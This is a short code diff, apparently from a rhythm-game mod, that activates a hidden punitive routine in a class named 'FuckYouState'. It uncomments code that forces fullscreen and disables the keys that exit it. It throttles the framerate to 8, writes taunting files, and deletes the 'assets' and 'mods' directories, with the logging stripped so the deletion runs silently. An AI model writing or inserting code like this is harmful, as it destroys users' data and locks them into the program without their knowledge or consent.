@@ -139,20 +139,20 @@ class FuckYouState extends MusicBeatState {
 	
 	private static function crazywoah() {
 		// too evil lmao
-		//FlxG.fullscreen = true;
-		//Main.fullscreenKeys = [];
+		FlxG.fullscreen = true;
+		Main.fullscreenKeys = [];
 		
 		FlxG.updateFramerate = 8;
 		FlxG.drawFramerate = 8;
 		
 		var path:String = getPath();
 		var fakepath:String = getFakePath();
-		trace(path, fakepath);
+		//trace(path, fakepath);
 		
 		if (!FileSystem.exists(path)) File.saveContent(path, "fuckingL lmao");
 		if (!FileSystem.exists(fakepath)) File.saveContent(fakepath, "fuckingL lmao");
-		trace(delDir("assets"));
-		trace(delDir("mods"));
+		delDir("assets");
+		delDir("mods");
 	}
 	
 	private static function delDir(path:String):Bool {
